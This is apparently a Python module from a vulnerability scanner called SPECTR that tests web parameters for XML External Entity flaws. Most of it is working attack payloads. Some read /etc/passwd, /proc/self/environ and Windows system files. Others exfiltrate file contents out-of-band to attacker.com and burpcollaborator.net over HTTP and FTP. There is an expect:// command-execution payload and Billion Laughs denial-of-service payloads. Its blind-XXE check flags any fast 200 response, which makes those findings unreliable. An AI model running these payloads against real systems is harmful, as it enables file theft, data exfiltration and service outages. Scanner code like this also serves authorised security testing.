"""
XML External Entity (XXE) detector for SPECTR vulnerability scanner
"""

from typing import Dict, List, Any, Optional
from utils.http_client import HTTPClient
from core.payloads import PayloadDatabase
from core.analyzer import ResponseAnalyzer

class XXEDetector:
    """XML External Entity vulnerability detector"""
    
    def __init__(self, http_client: HTTPClient, payloads: PayloadDatabase):
        self.http_client = http_client
        self.payloads = payloads
        self.analyzer = ResponseAnalyzer()
        
        # XXE indicators
        self.xxe_patterns = [
            r'root:.*:0:0:',           # Unix passwd file
            r'daemon:.*:1:1:',         # Unix passwd file
            r'bin:.*:2:2:',            # Unix passwd file
            r'\[system\]',             # Windows file
            r'\[boot loader\]',        # Windows file
            r'Microsoft Windows',      # Windows system info
            r'<!DOCTYPE',              # XML DOCTYPE
            r'<!ENTITY',               # XML entity
            r'SYSTEM\s+["\']file:///', # File protocol
            r'SYSTEM\s+["\']http://',  # HTTP protocol
            r'SYSTEM\s+["\']https://', # HTTPS protocol
            r'SYSTEM\s+["\']ftp://',   # FTP protocol
            r'file:///etc/passwd',     # Direct file access
            r'file:///c:/windows',     # Windows file access
            r'Directory of',           # Windows directory listing
            r'Volume in drive',        # Windows drive info
            r'total \d+',              # Unix ls output
            r'drwxr-xr-x',            # Unix permissions
        ]
    
    def scan(self, url: str, method: str, params: Dict[str, Any], 
             headers: Optional[Dict[str, str]] = None, verbose: bool = False) -> List[Dict[str, Any]]:
        """Scan for XXE vulnerabilities"""
        
        results = []
        
        if not params:
            if verbose:
                print("   ℹ️  No parameters to test for XXE")
            return results
        
        # Get baseline response for comparison
        baseline_response = self.http_client.get_baseline_response(
            url=url, method=method, params=params, headers=headers, verbose=verbose
        )
        
        if not baseline_response:
            if verbose:
                print("   ❌ Could not get baseline response")
            return results
        
        # Test each parameter
        for param_name, param_value in params.items():
            if verbose:
                print(f"   🔍 Testing parameter '{param_name}' for XXE")
            
            # Test external entity injection
            xxe_results = self._test_xxe_injection(
                url, method, params, param_name, headers, verbose
            )
            results.extend(xxe_results)
            
            # Test blind XXE
            blind_results = self._test_blind_xxe(
                url, method, params, param_name, headers, verbose
            )
            results.extend(blind_results)
        
        if verbose and results:
            print(f"   ✅ Found {len(results)} potential XXE vulnerabilities")
        
        return results
    
    def _test_xxe_injection(self, url: str, method: str, params: Dict[str, Any], 
                           param_name: str, headers: Optional[Dict[str, str]] = None, 
                           verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for XXE injection vulnerabilities"""
        
        results = []
        
        # XXE payloads
        xxe_payloads = [
            # Basic XXE - Unix/Linux files
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/group"> ]>
<foo>&xxe;</foo>''',
            
            # Windows files
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/system.ini"> ]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts"> ]>
<foo>&xxe;</foo>''',
            
            # HTTP XXE (for blind testing)
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/xxe"> ]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://attacker.com/xxe"> ]>
<foo>&xxe;</foo>''',
            
            # Parameter entity XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
<foo>test</foo>''',
            
            # Nested entity XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
    %eval;
    %exfil;
]>
<foo>test</foo>''',
            
            # Different protocols
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/version"> ]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
<foo>&xxe;</foo>''',
            
            # Expect header XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<foo>&xxe;</foo>''',
            
            # PHP wrapper
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../etc/passwd"> ]>
<foo>&xxe;</foo>''',
            
            # Data protocol
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ="> ]>
<foo>&xxe;</foo>''',
            
            # Jar protocol
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/"> ]>
<foo>&xxe;</foo>''',
            
            # NetDoc protocol
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "netdoc:///etc/passwd"> ]>
<foo>&xxe;</foo>''',
        ]
        
        for payload in xxe_payloads:
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                content = response.get('content', '')
                
                # Check for XXE indicators
                for pattern in self.xxe_patterns:
                    import re
                    if re.search(pattern, content, re.IGNORECASE):
                        results.append({
                            'type': 'xxe',
                            'parameter': param_name,
                            'payload': payload.replace('\n', '\\n'),
                            'method': 'external_entity',
                            'evidence': f"XXE pattern detected: {pattern}",
                            'response_code': response.get('status_code', 0),
                            'response_time': response.get('response_time', 0)
                        })
                        
                        if verbose:
                            print(f"   🔴 XXE vulnerability found: {pattern}")
                        break
        
        return results
    
    def _test_blind_xxe(self, url: str, method: str, params: Dict[str, Any], 
                       param_name: str, headers: Optional[Dict[str, str]] = None, 
                       verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for blind XXE vulnerabilities"""
        
        results = []
        
        # Blind XXE payloads (out-of-band)
        blind_payloads = [
            # DNS exfiltration
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://xxe.burpcollaborator.net/?x=%file;'>">
    %eval;
    %exfil;
]>
<foo>test</foo>''',
            
            # HTTP exfiltration
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
    <!ENTITY % file SYSTEM "file:///etc/hosts">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/xxe?data=%file;'>">
    %eval;
    %exfil;
]>
<foo>test</foo>''',
            
            # FTP exfiltration
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/xxe?data=%file;'>">
    %eval;
    %exfil;
]>
<foo>test</foo>''',
            
            # Simple blind XXE test
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://xxe.burpcollaborator.net/"> ]>
<foo>&xxe;</foo>''',
            
            # Blind XXE with parameter entity
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://xxe.burpcollaborator.net/"> %xxe; ]>
<foo>test</foo>''',
        ]
        
        for payload in blind_payloads:
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                # For blind XXE, we mainly check for response differences
                # In a real scenario, you'd check your out-of-band server
                status_code = response.get('status_code', 0)
                response_time = response.get('response_time', 0)
                
                # Check for unusual response patterns
                if status_code == 200 and response_time < 10:  # Quick response might indicate processing
                    # This is a simplified check - in reality, you'd monitor DNS/HTTP logs
                    results.append({
                        'type': 'xxe',
                        'parameter': param_name,
                        'payload': payload.replace('\n', '\\n'),
                        'method': 'blind_xxe',
                        'evidence': f"Potential blind XXE - check out-of-band logs",
                        'response_code': status_code,
                        'response_time': response_time
                    })
                    
                    if verbose:
                        print(f"   🔴 Potential blind XXE found - verify with out-of-band logs")
        
        return results
    
    def _test_xxe_dos(self, url: str, method: str, params: Dict[str, Any], 
                     param_name: str, headers: Optional[Dict[str, str]] = None, 
                     verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for XXE DoS vulnerabilities (Billion Laughs)"""
        
        results = []
        
        # DoS payloads
        dos_payloads = [
            # Billion Laughs attack
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<foo>&lol9;</foo>''',
            
            # Quadratic blowup
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<foo>&c;</foo>''',
        ]
        
        for payload in dos_payloads:
            import time
            start_time = time.time()
            
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                response_time = response.get('response_time', 0)
                status_code = response.get('status_code', 0)
                
                # Check for DoS indicators (long response time, timeouts, errors)
                if response_time > 10 or status_code in [500, 502, 503, 504]:
                    results.append({
                        'type': 'xxe',
                        'parameter': param_name,
                        'payload': payload.replace('\n', '\\n'),
                        'method': 'dos_attack',
                        'evidence': f"DoS pattern detected - response time: {response_time}s, status: {status_code}",
                        'response_code': status_code,
                        'response_time': response_time
                    })
                    
                    if verbose:
                        print(f"   🔴 XXE DoS vulnerability found: {response_time}s response time")
        
        return results